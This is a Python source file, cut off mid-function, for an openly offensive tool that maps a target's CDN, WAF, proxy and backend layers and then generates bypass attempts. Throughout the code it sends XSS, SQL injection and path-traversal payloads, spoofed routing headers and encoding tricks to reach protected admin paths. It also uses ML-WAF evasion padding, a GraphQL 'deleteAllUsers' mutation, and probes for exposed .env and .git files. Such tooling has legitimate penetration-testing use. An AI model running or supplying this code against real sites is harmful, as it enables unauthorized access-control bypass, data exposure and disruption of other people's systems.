#!/usr/bin/env python3
"""
Application Stack Traceroute & Bypass Generator
Next-Generation WAF/Proxy/Backend Chain Analysis Tool

Innovative Features:
- Maps complete request processing chain (WAF->CDN->Proxy->Backend)
- Identifies parsing discrepancies between layers
- Generates custom bypass payloads for each discovered discrepancy
- Protocol confusion testing (HTTP/1.1, HTTP/2, HTTP/3)
- Multi-layer encoding analysis
- Parser state machine confusion detection
- ENHANCED: Advanced bypass techniques based on deep discrepancies
- ENHANCED: JSON export for bypass automation
"""

import requests
import asyncio
import aiohttp
import json
import time
import base64
import urllib.parse
import zlib
import gzip
import random
import string
import socket
import ssl
import h2.connection
import h2.config
from urllib.parse import urlparse
import re
from collections import defaultdict
import concurrent.futures
import threading
import queue
from datetime import datetime

class ApplicationTraceroute:
    def __init__(self, target_url, forbidden_endpoint=None, skip_forbidden_tests=False):
        self.target_url = target_url.rstrip('/')
        self.parsed_url = urlparse(target_url)
        self.session = requests.Session()
        
        # Forbidden endpoint configuration
        self.forbidden_endpoint = forbidden_endpoint
        self.skip_forbidden_tests = skip_forbidden_tests
        self.discovered_forbidden_endpoint = None
        
        # Chain discovery results
        self.chain_map = {
            'layers': [],
            'discrepancies': [],
            'fingerprints': {},
            'bypasses': []
        }
        
        # Protocol support detection
        self.protocols = {
            'http1': True,
            'http2': False,
            'http3': False,
            'websocket': False
        }
        
    def log_discovery(self, layer, discovery_type, details):
        """Log discoveries with structured data"""
        timestamp = time.strftime('%H:%M:%S')
        print(f"[{timestamp}] 🔍 {layer} - {discovery_type}: {details}")
        
        if layer not in self.chain_map['fingerprints']:
            self.chain_map['fingerprints'][layer] = {}
        self.chain_map['fingerprints'][layer][discovery_type] = details

    def generate_unique_markers(self):
        """Generate unique markers for request tracking"""
        return {
            'uuid': ''.join(random.choices(string.ascii_lowercase + string.digits, k=16)),
            'timestamp': str(int(time.time())),
            'sequence': str(random.randint(100000, 999999))
        }

    def find_forbidden_endpoint(self):
        """Find an endpoint that returns 403/401 for bypass testing"""
        print("\n🔍 Phase 0: Finding Forbidden Endpoint for Testing")
        
        # If specified by user, verify it's actually forbidden
        if self.forbidden_endpoint:
            try:
                response = self.session.get(self.forbidden_endpoint, timeout=5)
                if response.status_code in [401, 403]:
                    self.discovered_forbidden_endpoint = self.forbidden_endpoint
                    self.log_discovery("Setup", "Forbidden Endpoint", f"User-provided: {self.forbidden_endpoint} ({response.status_code})")
                    return self.forbidden_endpoint
                else:
                    print(f"  ⚠️ Provided endpoint returned {response.status_code}, not 403/401. Searching for alternatives...")
            except Exception as e:
                print(f"  ⚠️ Error checking provided endpoint: {e}")
        
        # Search for common protected endpoints
        common_protected = [
            '/admin', '/wp-admin', '/administrator', '/secure', '/api/admin',
            '/manage', '/console', '/portal', '/control', '/private',
            '/restricted', '/staff', '/backend', '/cpanel', '/webadmin',
            '/.env', '/.git', '/config', '/phpmyadmin', '/adminer'
        ]
        
        for endpoint in common_protected:
            try:
                url = self.target_url + endpoint
                response = self.session.get(url, timeout=5, allow_redirects=False)
                if response.status_code in [401, 403]:
                    self.discovered_forbidden_endpoint = url
                    self.log_discovery("Setup", "Forbidden Endpoint Found", f"{endpoint} ({response.status_code})")
                    return url
            except:
                continue
        
        # If no forbidden endpoint found
        if not self.skip_forbidden_tests:
            print("  ⚠️ No forbidden endpoint found - some bypass tests will be limited")
            print("  💡 Tip: Use --forbidden-endpoint to specify one, or --skip-forbidden-tests to skip these tests")
        
        return None

    def create_fingerprint_payloads(self):
        """Create payloads to fingerprint each layer in the chain"""
        markers = self.generate_unique_markers()
        
        return {
            'cdn_detection': {
                'headers': {
                    'X-CDN-Test': markers['uuid'],
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                },
                'expected_responses': ['cloudflare', 'cloudfront', 'fastly', 'akamai']
            },
            
            'waf_detection': {
                'payloads': [
                    f"/?test=<script>alert('{markers['uuid']}')</script>",
                    f"/?test=' OR 1=1 -- {markers['uuid']}",
                    f"/?test=../../../etc/passwd#{markers['uuid']}"
                ],
                'headers': {'User-Agent': f'Mozilla/5.0 (test-{markers["uuid"]})'}
            },
            
            'proxy_detection': {
                'headers': {
                    'X-Forwarded-For': f'127.0.0.1,{markers["uuid"]}',
                    'X-Real-IP': f'192.168.1.{markers["sequence"][:3]}',
                    'X-Proxy-Test': markers['uuid']
                }
            },
            
            'backend_detection': {
                'paths': [
                    f'/server-info?test={markers["uuid"]}',
                    f'/server-status?test={markers["uuid"]}',
                    f'/.env?test={markers["uuid"]}',
                    f'/phpinfo.php?test={markers["uuid"]}'
                ]
            }
        }

    async def protocol_discovery(self):
        """Discover supported protocols"""
        print("\n🔍 Phase 1: Protocol Discovery")
        
        # HTTP/2 Detection
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(self.target_url) as response:
                    if hasattr(response, 'version') and response.version.major >= 2:
                        self.protocols['http2'] = True
                        self.log_discovery("Protocol", "HTTP/2", "Supported")
        except:
            pass
        
        # HTTP/3 Detection (via Alt-Svc header)
        try:
            response = self.session.head(self.target_url)
            alt_svc = response.headers.get('Alt-Svc', '')
            if 'h3' in alt_svc or 'h3-29' in alt_svc:
                self.protocols['http3'] = True
                self.log_discovery("Protocol", "HTTP/3", f"Detected via Alt-Svc: {alt_svc}")
        except:
            pass
        
        # WebSocket Detection
        try:
            ws_headers = {
                'Upgrade': 'websocket',
                'Connection': 'Upgrade',
                'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                'Sec-WebSocket-Version': '13'
            }
            response = self.session.get(self.target_url, headers=ws_headers)
            if response.status_code == 101:
                self.protocols['websocket'] = True
                self.log_discovery("Protocol", "WebSocket", "Upgrade supported")
        except:
            pass

    def infrastructure_fingerprinting(self):
        """Fingerprint infrastructure components"""
        print("\n🔍 Phase 2: Infrastructure Fingerprinting")
        
        fingerprints = self.create_fingerprint_payloads()
        
        # CDN Detection
        try:
            response = self.session.get(self.target_url, headers=fingerprints['cdn_detection']['headers'])
            
            # Analyze response headers for CDN signatures
            cdn_indicators = {
                'cloudflare': ['cf-ray', 'cf-cache-status', 'server.*cloudflare'],
                'cloudfront': ['x-amz-cf', 'x-cache.*cloudfront'],
                'fastly': ['fastly-debug', 'x-served-by.*fastly'],
                'akamai': ['akamai-origin-hop', 'x-akamai'],
                'incapsula': ['x-iinfo', 'incap_ses'],
                'sucuri': ['x-sucuri', 'server.*sucuri']
            }
            
            detected_cdn = None
            for cdn, indicators in cdn_indicators.items():
                for indicator in indicators:
                    for header, value in response.headers.items():
                        if re.search(indicator, f"{header}: {value}", re.IGNORECASE):
                            detected_cdn = cdn
                            break
                if detected_cdn:
                    break
            
            if detected_cdn:
                self.log_discovery("CDN", "Detection", detected_cdn)
                self.chain_map['layers'].append(f"CDN-{detected_cdn}")
            
        except Exception as e:
            self.log_discovery("CDN", "Error", str(e))
        
        # WAF Detection
        self.waf_fingerprinting(fingerprints['waf_detection'])
        
        # Proxy Detection  
        self.proxy_fingerprinting(fingerprints['proxy_detection'])
        
        # Backend Detection
        self.backend_fingerprinting(fingerprints['backend_detection'])

    def waf_fingerprinting(self, waf_payloads):
        """Advanced WAF fingerprinting"""
        print("  🛡️ WAF Detection...")
        
        waf_signatures = {
            'cloudflare': ['cf-ray', 'cloudflare', 'error 1020'],
            'aws-waf': ['awselb', 'aws', 'x-amzn'],
            'imperva': ['incap_ses', 'visid_incap', 'imperva'],
            'akamai': ['akamai', 'ak-bmsc'],
            'wordfence': ['wordfence', 'this site is protected'],
            'sucuri': ['sucuri', 'access denied.*sucuri'],
            'barracuda': ['barracuda', 'bnsv'],
            'f5': ['f5', 'bigip', 'x-wa-info'],
            'fortinet': ['fortigate', 'fortiweb']
        }
        
        detected_waf = None
        
        for payload in waf_payloads['payloads']:
            try:
                response = self.session.get(
                    f"{self.target_url}{payload}",
                    headers=waf_payloads['headers'],
                    timeout=10
                )
                
                # Analyze response for WAF signatures
                full_response = f"{response.status_code} {response.headers} {response.text}".lower()
                
                for waf, signatures in waf_signatures.items():
                    for signature in signatures:
                        if re.search(signature, full_response):
                            detected_waf = waf
                            break
                    if detected_waf:
                        break
                
                if detected_waf:
                    break
                    
            except Exception as e:
                continue
        
        if detected_waf:
            self.log_discovery("WAF", "Detection", detected_waf)
            self.chain_map['layers'].append(f"WAF-{detected_waf}")
        else:
            self.log_discovery("WAF", "Detection", "None detected or unknown")

    def proxy_fingerprinting(self, proxy_headers):
        """Detect proxy/load balancer configuration"""
        print("  🔄 Proxy Detection...")
        
        try:
            response = self.session.get(self.target_url, headers=proxy_headers['headers'])
            
            proxy_indicators = {
                'nginx': ['server.*nginx', 'x-nginx'],
                'apache': ['server.*apache', 'x-apache'],
                'haproxy': ['server.*haproxy'],
                'traefik': ['server.*traefik'],
                'envoy': ['server.*envoy', 'x-envoy'],
                'istio': ['server.*istio'],
                'linkerd': ['l5d-'],
                'aws-alb': ['awsalb', 'elbv2'],
                'gcp-lb': ['via.*google frontend']
            }
            
            detected_proxy = None
            for proxy, indicators in proxy_indicators.items():
                for indicator in indicators:
                    for header, value in response.headers.items():
                        if re.search(indicator, f"{header}: {value}", re.IGNORECASE):
                            detected_proxy = proxy
                            break
                if detected_proxy:
                    break
            
            if detected_proxy:
                self.log_discovery("Proxy", "Detection", detected_proxy)
                self.chain_map['layers'].append(f"Proxy-{detected_proxy}")
            
        except Exception as e:
            self.log_discovery("Proxy", "Error", str(e))

    def backend_fingerprinting(self, backend_paths):
        """Fingerprint backend application server"""
        print("  🖥️ Backend Detection...")
        
        backend_signatures = {
            'apache': ['server.*apache'],
            'nginx': ['server.*nginx'],
            'iis': ['server.*iis', 'x-aspnet-version'],
            'tomcat': ['server.*tomcat'],
            'jetty': ['server.*jetty'],
            'node': ['x-powered-by.*express', 'x-powered-by.*node'],
            'php': ['x-powered-by.*php', 'server.*php'],
            'python': ['server.*gunicorn', 'server.*uwsgi'],
            'ruby': ['server.*puma', 'x-powered-by.*ruby'],
            'go': ['server.*go']
        }
        
        detected_backend = None
        
        for path in backend_paths['paths']:
            try:
                response = self.session.get(f"{self.target_url}{path}", timeout=5)
                
                full_response = f"{response.headers} {response.text}".lower()
                
                for backend, signatures in backend_signatures.items():
                    for signature in signatures:
                        if re.search(signature, full_response):
                            detected_backend = backend
                            break
                    if detected_backend:
                        break
                
                if detected_backend:
                    break
                    
            except Exception as e:
                continue
        
        if detected_backend:
            self.log_discovery("Backend", "Detection", detected_backend)
            self.chain_map['layers'].append(f"Backend-{detected_backend}")

    def parser_discrepancy_testing(self):
        """Test for parsing discrepancies between layers"""
        print("\n🔍 Phase 3: Parser Discrepancy Analysis")
        
        # Original tests
        discrepancy_tests = [
            self.test_http_smuggling,
            self.test_unicode_confusion,
            self.test_encoding_discrepancies,
            self.test_header_confusion,
            self.test_method_confusion,
            self.test_path_normalization,
            self.test_parameter_pollution,
            self.test_tcp_fragmentation,
            self.test_compression_bomb,
            self.test_timing_race_conditions,
            # New advanced tests
            self.test_parser_state_confusion,
            self.test_buffer_boundary_discrepancies,
            self.test_nested_encoding_confusion,
            self.test_protocol_tunneling_discrepancies,
            self.test_cache_key_confusion,
            self.test_parser_backtracking_dos,
            self.test_integer_overflow_length,
            self.test_toctou_race_conditions,
            self.test_quic_http3_confusion,
            self.test_ml_waf_evasion,
            self.test_container_orchestration_bypass,
            self.test_graphql_rest_confusion
        ]
        
        for test in discrepancy_tests:
            try:
                test()
            except Exception as e:
                print(f"  ❌ Error in {test.__name__}: {str(e)}")

    # Advanced Discrepancy Tests
    def test_parser_state_confusion(self):
        """Test parser state machine desynchronization"""
        print("  🔄 Testing Parser State Machine Confusion...")
        
        # HTTP/2 Pseudo-Header Injection
        try:
            headers = {
                ':method': 'GET',
                ':path': '/admin',
                ':authority': 'internal.backend',
                ':scheme': 'https',
                'x-override-method': 'POST'
            }
            
            response = self.session.get(self.target_url, headers=headers, timeout=5)
            
            if response.status_code != 400:  # Should fail with pseudo-headers in HTTP/1.1
                discrepancy = {
                    'type': 'Parser State Confusion',
                    'subtype': 'H2 Pseudo-Header Injection',
                    'description': 'HTTP/2 pseudo-headers accepted in HTTP/1.1 context',
                    'headers': headers,
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Parser State", "H2 pseudo-header confusion")
        except:
            pass
        
        # WebSocket Upgrade State Confusion
        try:
            # Step 1: Start WebSocket upgrade
            ws_headers = {
                'Upgrade': 'websocket',
                'Connection': 'Upgrade',
                'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                'Sec-WebSocket-Version': '13'
            }
            
            # Send partial upgrade
            response1 = self.session.get(self.target_url, headers=ws_headers, timeout=2)
            
            # Step 2: Send normal request immediately after
            # Use discovered forbidden endpoint if available
            test_endpoint = self.discovered_forbidden_endpoint or f"{self.target_url}/admin"
            response2 = self.session.get(test_endpoint, timeout=2)
            
            if response2.status_code == 200:
                discrepancy = {
                    'type': 'Parser State Confusion',
                    'subtype': 'WebSocket State Leak',
                    'description': 'Parser state leaked between WebSocket and HTTP',
                    'evidence': 'Admin path accessible after WebSocket attempt'
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Parser State", "WebSocket state leak")
        except:
            pass

    def test_buffer_boundary_discrepancies(self):
        """Test buffer boundary confusion"""
        print("  📊 Testing Buffer Boundary Discrepancies...")
        
        # Header Buffer Boundary Test
        try:
            # Test 8KB boundary
            large_header_value = 'A' * 8192
            headers = {
                'X-Large-Header': large_header_value[:8000],
                'X-Secret': 'admin'  # This might get processed differently
            }
            
            response = self.session.get(self.target_url, headers=headers, timeout=5)
            
            if response.status_code in [200, 413, 431]:
                discrepancy = {
                    'type': 'Buffer Boundary',
                    'subtype': 'Header Buffer Overflow',
                    'description': 'Headers at 8KB boundary processed differently',
                    'buffer_size': 8192,
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Buffer Boundary", "8KB header boundary")
        except:
            pass
        
        # URL Length Boundary Test
        try:
            # Test 2KB vs 8KB URL limits
            for size in [2048, 4096, 8192]:
                long_path = '/' + 'A' * (size - 20) + '/../admin'
                response = self.session.get(f"{self.target_url}{long_path}", timeout=5)
                
                if response.status_code != 414:
                    discrepancy = {
                        'type': 'Buffer Boundary',
                        'subtype': 'URL Length Limit',
                        'description': f'URL accepted at {size} bytes',
                        'buffer_size': size,  # Changed from 'url_length' to 'buffer_size' for consistency
                        'response_code': response.status_code
                    }
                    self.chain_map['discrepancies'].append(discrepancy)
                    self.log_discovery("Discrepancy", "Buffer Boundary", f"{size} byte URL accepted")
        except:
            pass

    def test_nested_encoding_confusion(self):
        """Test nested encoding state stack confusion"""
        print("  🔢 Testing Nested Encoding Confusion...")
        
        # Mixed UTF-8 and UTF-16 BOM switching
        try:
            # UTF-8 BOM followed by UTF-16 BOM
            payload = b'\xef\xbb\xbf/admin\xff\xfe'
            response = self.session.get(
                self.target_url,
                data=payload,
                headers={'Content-Type': 'text/plain'},
                timeout=5
            )
            
            if response.status_code != 400:
                discrepancy = {
                    'type': 'Nested Encoding',
                    'subtype': 'BOM Switching',
                    'description': 'Mixed BOM encoding accepted',
                    'payload': 'UTF-8 BOM + /admin + UTF-16 BOM',
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Encoding", "BOM switching accepted")
        except:
            pass
        
        # Percent-Encoding in Different Bases
        encoding_variations = [
            ('Hex Standard', '/%61dmin'),
            ('Octal', '/%0141dmin'),
            ('Unicode IIS', '/%u0061dmin'),
            ('Double Decimal', '/%%36%31dmin')
        ]
        
        for name, path in encoding_variations:
            try:
                response = self.session.get(f"{self.target_url}{path}", timeout=5)
                if response.status_code == 200:
                    discrepancy = {
                        'type': 'Nested Encoding',
                        'subtype': f'{name} Encoding',
                        'description': f'{name} encoding decoded to /admin',
                        'encoded_path': path,
                        'response_code': response.status_code
                    }
                    self.chain_map['discrepancies'].append(discrepancy)
                    self.log_discovery("Discrepancy", "Encoding", f"{name} encoding accepted")
            except:
                pass

    def test_protocol_tunneling_discrepancies(self):
        """Test protocol nesting confusion"""
        print("  🔀 Testing Protocol Tunneling Discrepancies...")
        
        # HTTP in HTTP (Absolute URI)
        try:
            response = self.session.request(
                'GET',
                f"{self.target_url}",
                headers={
                    'Host': 'public.site',
                    'X-Original-URL': 'http://internal.backend/admin'
                },
                timeout=5
            )
            
            if 'admin' in response.text.lower() or response.status_code == 200:
                discrepancy = {
                    'type': 'Protocol Tunneling',
                    'subtype': 'Absolute URI Confusion',
                    'description': 'Internal URL accessible via header',
                    'technique': 'X-Original-URL header',
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Protocol Tunneling", "Absolute URI confusion")
        except:
            pass
        
        # Multiple Protocol Upgrades
        try:
            headers = {
                'Upgrade': 'websocket, h2c, spdy/3.1',
                'Connection': 'Upgrade'
            }
            
            response = self.session.get(self.target_url, headers=headers, timeout=5)
            
            if response.status_code not in [400, 426]:
                discrepancy = {
                    'type': 'Protocol Tunneling',
                    'subtype': 'Multiple Upgrade Confusion',
                    'description': 'Multiple protocol upgrades not rejected',
                    'protocols': 'websocket, h2c, spdy/3.1',
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Protocol", "Multiple upgrades accepted")
        except:
            pass

    def test_cache_key_confusion(self):
        """Test cache key computation discrepancies"""
        print("  🔑 Testing Cache Key Confusion...")
        
        # Case Sensitivity Mismatch
        case_variations = [
            ('/ADMIN', 'example.com'),
            ('/admin', 'EXAMPLE.COM'),
            ('/Admin', 'Example.Com')
        ]
        
        responses = {}
        for path, host in case_variations:
            try:
                response = self.session.get(
                    f"{self.target_url}{path}",
                    headers={'Host': host},
                    timeout=5
                )
                key = f"{path}:{host}"
                responses[key] = response.status_code
            except:
                pass
        
        if len(set(responses.values())) > 1:
            discrepancy = {
                'type': 'Cache Key Confusion',
                'subtype': 'Case Sensitivity',
                'description': 'Different responses for case variations',
                'responses': responses,
                'unique_codes': len(set(responses.values()))
            }
            self.chain_map['discrepancies'].append(discrepancy)
            self.log_discovery("Discrepancy", "Cache", f"Case sensitivity: {len(set(responses.values()))} different responses")
        
        # Parameter Order Confusion
        param_variations = [
            '/?b=2&a=1',
            '/?a=1&b=2',
            '/?a=1&b=2&',
            '/?a=1&amp;b=2'
        ]
        
        param_responses = {}
        for params in param_variations:
            try:
                response = self.session.get(f"{self.target_url}{params}", timeout=5)
                param_responses[params] = response.status_code
            except:
                pass
        
        if len(set(param_responses.values())) > 1:
            discrepancy = {
                'type': 'Cache Key Confusion',
                'subtype': 'Parameter Order',
                'description': 'Parameter order affects caching',
                'variations': param_responses
            }
            self.chain_map['discrepancies'].append(discrepancy)
            self.log_discovery("Discrepancy", "Cache", "Parameter order matters")

    def test_parser_backtracking_dos(self):
        """Test parser algorithmic complexity"""
        print("  ⏱️ Testing Parser Backtracking...")
        
        # Nested Parameter Parsing Complexity
        try:
            # Create deeply nested parameters
            nested_params = []
            for i in range(5):
                for j in range(5):
                    for k in range(5):
                        nested_params.append(f'p[{i}][{j}][{k}]=v')
            
            complex_query = '&'.join(nested_params)
            
            start_time = time.time()
            response = self.session.get(
                f"{self.target_url}/?{complex_query}",
                timeout=10
            )
            elapsed = time.time() - start_time
            
            if elapsed > 2:  # Slow processing indicates complexity issue
                discrepancy = {
                    'type': 'Parser Complexity',
                    'subtype': 'Nested Parameter DoS',
                    'description': 'Nested parameters cause slow parsing',
                    'processing_time': elapsed,
                    'complexity': 'O(n³)',
                    'param_count': len(nested_params)
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Parser DoS", f"Slow parsing: {elapsed:.2f}s")
        except:
            pass

    def test_integer_overflow_length(self):
        """Test integer overflow in length calculations"""
        print("  🔢 Testing Integer Overflow in Lengths...")
        
        overflow_values = [
            ('2^32', '4294967296'),
            ('2^31', '2147483648'),
            ('Negative', '-1'),
            ('Scientific', '1e3'),
            ('Hex', '0x100')
        ]
        
        for name, value in overflow_values:
            try:
                headers = {
                    'Content-Length': value,
                    'Transfer-Encoding': 'chunked'  # Fallback
                }
                
                response = self.session.post(
                    self.target_url,
                    headers=headers,
                    data=b'test',
                    timeout=5
                )
                
                if response.status_code not in [400, 411, 413]:
                    discrepancy = {
                        'type': 'Integer Overflow',
                        'subtype': f'{name} Content-Length',
                        'description': f'Non-standard length value accepted: {value}',
                        'length_value': value,
                        'response_code': response.status_code
                    }
                    self.chain_map['discrepancies'].append(discrepancy)
                    self.log_discovery("Discrepancy", "Integer", f"{name} length: {value}")
            except:
                pass

    def test_toctou_race_conditions(self):
        """Test Time-of-Check vs Time-of-Use race conditions"""
        print("  ⚡ Testing TOCTOU Race Conditions...")
        
        # Skip if no forbidden endpoint found
        if not self.discovered_forbidden_endpoint and not self.skip_forbidden_tests:
            print("    ⚠️ Skipping TOCTOU test - no forbidden endpoint available")
            return
        
        try:
            results = []
            
            # Use discovered forbidden endpoint or fallback
            test_endpoint = self.discovered_forbidden_endpoint or f"{self.target_url}/api/admin"
            
            def race_request(delay):
                time.sleep(delay)
                try:
                    resp = self.session.get(test_endpoint, timeout=3)
                    results.append((delay, resp.status_code))
                except:
                    results.append((delay, 'error'))
            
            # Send requests with micro-delays
            threads = []
            for delay in [0, 0.001, 0.01, 0.05]:
                thread = threading.Thread(target=race_request, args=(delay,))
                threads.append(thread)
                thread.start()
            
            for thread in threads:
                thread.join()
            
            # Check for timing-dependent differences
            status_codes = [r[1] for r in results if r[1] != 'error']
            if len(set(status_codes)) > 1:
                discrepancy = {
                    'type': 'TOCTOU Race',
                    'subtype': 'Async Validation',
                    'description': 'Race condition in request validation',
                    'timing_results': results,
                    'unique_responses': len(set(status_codes))
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "TOCTOU", f"Race condition detected: {len(set(status_codes))} responses")
        except:
            pass

    def test_quic_http3_confusion(self):
        """Test QUIC/HTTP3 specific discrepancies"""
        print("  🚀 Testing QUIC/HTTP3 Confusion...")
        
        if self.protocols['http3']:
            try:
                # Test Alt-Svc manipulation
                headers = {
                    'Alt-Used': 'evil.com:443',
                    'Alt-Svc': 'h3-29=":443"; ma=86400'
                }
                
                response = self.session.get(self.target_url, headers=headers, timeout=5)
                
                if response.status_code == 200:
                    discrepancy = {
                        'type': 'QUIC/HTTP3',
                        'subtype': 'Alt-Svc Manipulation',
                        'description': 'Alt-Svc headers accepted and may affect routing',
                        'headers': headers
                    }
                    self.chain_map['discrepancies'].append(discrepancy)
                    self.log_discovery("Discrepancy", "QUIC", "Alt-Svc manipulation possible")
            except:
                pass

    def test_ml_waf_evasion(self):
        """Test ML-based WAF evasion techniques"""
        print("  🤖 Testing ML WAF Evasion...")
        
        # Adversarial Padding
        try:
            benign_tokens = ['user', 'login', 'welcome', 'dashboard', 'profile']
            padding = ' '.join(random.choices(benign_tokens, k=100))
            
            payload = f"{padding} <script>alert(1)</script> {padding}"
            
            response = self.session.get(
                f"{self.target_url}/?q={urllib.parse.quote(payload)}",
                timeout=5
            )
            
            if response.status_code not in [403, 406]:
                discrepancy = {
                    'type': 'ML WAF Evasion',
                    'subtype': 'Adversarial Padding',
                    'description': 'Benign token padding may confuse ML models',
                    'padding_size': len(padding),
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "ML Evasion", "Adversarial padding effective")
        except:
            pass
        
        # Context Window Overflow
        try:
            # Create payload that exceeds typical context windows
            pre_context = 'safe content ' * 200  # ~2400 chars
            malicious = '<img src=x onerror=alert(1)>'
            post_context = ' safe content' * 200
            
            full_payload = pre_context + malicious + post_context
            
            response = self.session.post(
                self.target_url,
                data={'content': full_payload},
                timeout=5
            )
            
            if response.status_code not in [403, 406]:
                discrepancy = {
                    'type': 'ML WAF Evasion',
                    'subtype': 'Context Window Overflow',
                    'description': 'Large context may exceed ML model window',
                    'payload_size': len(full_payload),
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "ML Evasion", "Context window overflow")
        except:
            pass

    def test_container_orchestration_bypass(self):
        """Test container/orchestration layer bypasses"""
        print("  🐳 Testing Container Orchestration Bypass...")
        
        # Service Mesh Headers
        try:
            # Use discovered forbidden endpoint if available
            test_endpoint = self.discovered_forbidden_endpoint or f"{self.target_url}/admin"
            parsed_endpoint = urlparse(test_endpoint)
            test_path = parsed_endpoint.path or '/admin'
            
            k8s_headers = {
                'X-Forwarded-Host': 'admin-service.default.svc.cluster.local',
                'X-Envoy-Decorator-Operation': 'admin-service.admin.svc.cluster.local/*',
                'X-B3-TraceId': ''.join(random.choices('0123456789abcdef', k=32)),
                'X-B3-SpanId': ''.join(random.choices('0123456789abcdef', k=16))
            }
            
            response = self.session.get(
                test_endpoint,
                headers=k8s_headers,
                timeout=5
            )
            
            if response.status_code == 200:
                discrepancy = {
                    'type': 'Container Orchestration',
                    'subtype': 'Service Mesh Headers',
                    'description': 'K8s service mesh headers affect routing',
                    'headers': k8s_headers,
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "K8s", "Service mesh header bypass")
        except:
            pass

    def test_graphql_rest_confusion(self):
        """Test GraphQL-REST gateway confusion"""
        print("  📊 Testing GraphQL-REST Gateway Confusion...")
        
        try:
            # REST to GraphQL Injection
            graphql_in_rest = {
                'path': '/api/users/1;query{admin{password}}',
                'headers': {'Content-Type': 'application/json'}
            }
            
            response = self.session.get(
                f"{self.target_url}{graphql_in_rest['path']}",
                headers=graphql_in_rest['headers'],
                timeout=5
            )
            
            if 'admin' in response.text or 'graphql' in response.text.lower():
                discrepancy = {
                    'type': 'GraphQL-REST Confusion',
                    'subtype': 'REST to GraphQL Injection',
                    'description': 'GraphQL query in REST endpoint',
                    'injection_point': 'URL path parameter',
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "GraphQL", "REST-GraphQL boundary confusion")
        except:
            pass
        
        # GraphQL Batching via REST
        try:
            batch_payload = {
                'query': [
                    'query { user { name } }',
                    'mutation { deleteAllUsers }'
                ]
            }
            
            response = self.session.post(
                f"{self.target_url}/graphql",
                json=batch_payload,
                timeout=5
            )
            
            if response.status_code == 200:
                discrepancy = {
                    'type': 'GraphQL-REST Confusion',
                    'subtype': 'Batch Query Injection',
                    'description': 'GraphQL batching accepted via REST',
                    'technique': 'Array of queries'
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "GraphQL", "Batch queries accepted")
        except:
            pass

    def test_tcp_fragmentation(self):
        """Test TCP fragmentation bypass techniques"""
        print("  🌊 Testing TCP Fragmentation Bypass...")
        
        try:
            # Create a raw socket connection for fragmentation testing
            import socket
            
            # Test payload split across TCP segments
            target_host = self.parsed_url.hostname
            target_port = 443 if self.parsed_url.scheme == 'https' else 80
            
            # Create fragmented HTTP request
            request_part1 = b"GET /adm"
            request_part2 = b"in HTTP/1.1\r\nHost: " + target_host.encode() + b"\r\n\r\n"
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if self.parsed_url.scheme == 'https':
                import ssl
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=target_host)
            
            sock.connect((target_host, target_port))
            
            # Send fragmented request
            sock.send(request_part1)
            time.sleep(0.01)  # Small delay to ensure separate TCP segments
            sock.send(request_part2)
            
            response = sock.recv(4096).decode('utf-8', errors='ignore')
            sock.close()
            
            # Check if fragmentation affected processing
            if "200 OK" in response or "admin" in response.lower():
                discrepancy = {
                    'type': 'TCP Fragmentation',
                    'description': 'TCP fragmentation may bypass WAF inspection',
                    'evidence': 'Fragmented request processed differently',
                    'payload': {'part1': request_part1, 'part2': request_part2}
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "TCP Fragmentation", "Potential fragmentation bypass")
                
        except Exception as e:
            # Fallback to application-level testing
            self.log_discovery("TCP Fragmentation", "Info", "Raw socket test failed, using application-level test")

    def test_compression_bomb(self):
        """Test compression bomb bypass technique"""
        print("  💣 Testing Compression Bomb Bypass...")
        
        try:
            # Create a payload that's small compressed but large uncompressed
            large_payload = "A" * 10000  # 10KB uncompressed
            
            # Compress the payload
            compressed_payload = gzip.compress(large_payload.encode())
            
            # Test if WAF processes compressed vs uncompressed differently
            headers = {
                'Content-Encoding': 'gzip',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': str(len(compressed_payload))
            }
            
            response = self.session.post(
                self.target_url,
                data=compressed_payload,
                headers=headers,
                timeout=10
            )
            
            # Check for processing differences
            if response.status_code in [200, 413, 414, 502]:
                discrepancy = {
                    'type': 'Compression Bypass',
                    'description': 'Compression may affect WAF inspection',
                    'compressed_size': len(compressed_payload),
                    'uncompressed_size': len(large_payload),
                    'ratio': len(large_payload) / len(compressed_payload),
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Compression", f"Compression ratio: {discrepancy['ratio']:.1f}x")
                
        except Exception as e:
            pass

    def test_timing_race_conditions(self):
        """Test timing-based parser race conditions"""
        print("  ⏱️ Testing Timing Race Conditions...")
        
        try:
            # Test concurrent requests with timing variations
            import threading
            import queue
            
            results = queue.Queue()
            
            def send_delayed_request(delay, request_data):
                time.sleep(delay)
                try:
                    response = self.session.post(self.target_url, data=request_data, timeout=5)
                    results.put(('success', response.status_code, delay))
                except Exception as e:
                    results.put(('error', str(e), delay))
            
